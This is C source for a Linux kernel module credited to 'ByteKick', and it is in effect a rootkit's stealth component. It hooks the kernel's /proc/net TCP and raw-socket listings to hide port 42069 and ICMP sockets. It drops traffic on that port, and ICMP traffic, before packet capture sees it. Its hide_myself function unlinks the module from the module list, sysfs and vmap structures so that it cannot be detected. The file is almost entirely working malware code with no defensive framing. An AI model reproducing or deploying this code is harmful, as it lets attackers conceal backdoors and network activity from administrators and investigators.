#include <linux/module.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/icmpv6.h>
#include <linux/kernel.h>
#include <linux/vmalloc.h>
#include <linux/kprobes.h>

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
int (*t_real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
asmlinkage long (*orig_raw_seq_show)(struct seq_file *seq, void *v);
asmlinkage long (*orig_raw6_seq_show)(struct seq_file *seq, void *v);
#define PORT 42069 //the port that will be hidden
//only added ipv6 cuz mobile
int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
	struct iphdr *iph;
	struct ipv6hdr *ip6h;
	struct tcphdr *tcph;

	if (!strncmp(dev->name, "lo", 2))
		return NET_RX_DROP;

	if (skb_linearize(skb)) goto out;

	if (skb->protocol == htons(ETH_P_IP)) {
		iph = ip_hdr(skb);
		if (iph->protocol == IPPROTO_ICMP) return NET_RX_DROP;
		if (iph->protocol == IPPROTO_TCP) {
			tcph = (void *)iph + iph->ihl * 4;
			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
				return NET_RX_DROP;
		}
	} else if (skb->protocol == htons(ETH_P_IPV6)) {
		ip6h = ipv6_hdr(skb);
		if (ip6h->nexthdr == IPPROTO_ICMPV6) return NET_RX_DROP;
		if (ip6h->nexthdr == IPPROTO_TCP) {
			tcph = (void *)ip6h + sizeof(*ip6h);
			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
				return NET_RX_DROP;
		}
	}
out:
	return t_real_packet_rcv(skb, dev, pt, orig_dev);
}
asmlinkage long hooked_tcp4_seq_show(struct seq_file *s, void *v)
{
	struct sock *sk = v;
	int ret = (sk != (struct sock *)0x1 && sk->sk_num == PORT) ? 0 : orig_tcp4_seq_show(s, v);
	return ret;
}
asmlinkage long hooked_tcp6_seq_show(struct seq_file *s, void *v)
{
        struct sock *sk = v;
        int ret = (sk != (struct sock *)0x1 && sk->sk_num == PORT) ? 0 : orig_tcp6_seq_show(s, v);
        return ret;
}
asmlinkage long hooked_raw_seq_show(struct seq_file *seq, void *v)
{
	struct sock *sk = v;

	if (sk && sk->sk_protocol == IPPROTO_ICMP)
		return 0;

	return orig_raw_seq_show(seq, v);
}
asmlinkage long hooked_raw6_seq_show(struct seq_file *seq, void *v)
{
	struct sock *sk = v;

	if (sk && sk->sk_protocol == IPPROTO_ICMPV6)
		return 0;

	return orig_raw6_seq_show(seq, v);
}
//code from: https://github.com/sysprog21/lkm-hidden/blob/master/main.c
void hide_myself(void)
{
	struct vmap_area *va, *vtmp;
	struct module_use *use, *tmp;
	struct list_head *_vmap_area_list;
	struct rb_root *_vmap_area_root;

	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
        kallsyms_lookup_name_t kallsyms_lookup_name;
        register_kprobe(&kp);
        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
        unregister_kprobe(&kp);
	_vmap_area_list = (struct list_head *) kallsyms_lookup_name("vmap_area_list");
	_vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");

	list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
		if ((unsigned long) THIS_MODULE > va->va_start && (unsigned long) THIS_MODULE < va->va_end) {
			list_del(&va->list);
			rb_erase(&va->rb_node, _vmap_area_root);
		}
	}

	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list, target_list) {
		list_del(&use->source_list);
		list_del(&use->target_list);
		sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
		kfree(use);
	}

}

EXPORT_SYMBOL(hooked_tcp4_seq_show);
EXPORT_SYMBOL(orig_tcp4_seq_show);
EXPORT_SYMBOL(hooked_tcp6_seq_show);
EXPORT_SYMBOL(orig_tcp6_seq_show);
EXPORT_SYMBOL(hooked_tpacket_rcv);
EXPORT_SYMBOL(t_real_packet_rcv);
EXPORT_SYMBOL(hooked_raw_seq_show);
EXPORT_SYMBOL(orig_raw_seq_show);
EXPORT_SYMBOL(hooked_raw6_seq_show);
EXPORT_SYMBOL(orig_raw6_seq_show);
EXPORT_SYMBOL(hide_myself);
MODULE_AUTHOR("ByteKick");
MODULE_LICENSE("GPL");
